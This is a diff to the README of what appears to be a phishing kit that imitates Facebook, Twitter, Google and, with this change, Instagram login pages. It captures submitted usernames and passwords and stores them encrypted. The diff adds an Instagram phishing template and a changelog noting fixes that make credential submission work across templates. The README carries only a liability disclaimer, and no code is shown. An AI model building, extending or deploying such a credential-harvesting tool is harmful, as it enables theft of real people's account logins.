@@ -36,6 +36,7 @@ This project provides a phishing portal that mimics the login pages of major pro
   - Facebook
   - Twitter (X)
   - Google
+  - Instagram
 - **Responsive design:** Works on desktop and mobile devices.
 - **Credential capture:** Stores submitted usernames and passwords.
 - **Encrypted storage:** Credentials saved in encrypted format using Fernet.
@@ -215,6 +216,7 @@ python decode_credentials.py
   - `login_facebook.html`
   - `login_twitter.html`
   - `login_google.html`
+  - `login_instagram.html`
   - `select_provider.html` (provider selection page)
 - **Edit HTML** (`portal/templates/*.html`) and **CSS** (`portal/static/css/select_provider.css`) to change appearance. Logos are embedded as data URIs in `select_provider.html`.
 - **Add new providers:**
@@ -255,6 +257,10 @@ The author **assume no liability** for misuse or damages caused by this tool.
     - Added CSS hover animation (scale effect) to provider buttons on `select_provider.html`.
     - Fixed various minor CSS inconsistencies and styling issues.
 - **Code Refinements:** General code cleanup, improved error handling visibility, and fixed subprocess execution paths.
+- **Added Instagram Page:** Included a new phishing template for Instagram (`login_instagram.html`) and integrated it into the provider selection and backend logic.
+- **Bug Fixes:**
+    - Resolved persistent Fernet key errors by ensuring correct key generation and loading in `config.json` and `portal/app.py`.
+    - Fixed credential submission failures by updating `portal/app.py` to correctly handle both `username`/`password` and `email`/`pass` form field names used across different templates.
 
 ---
 
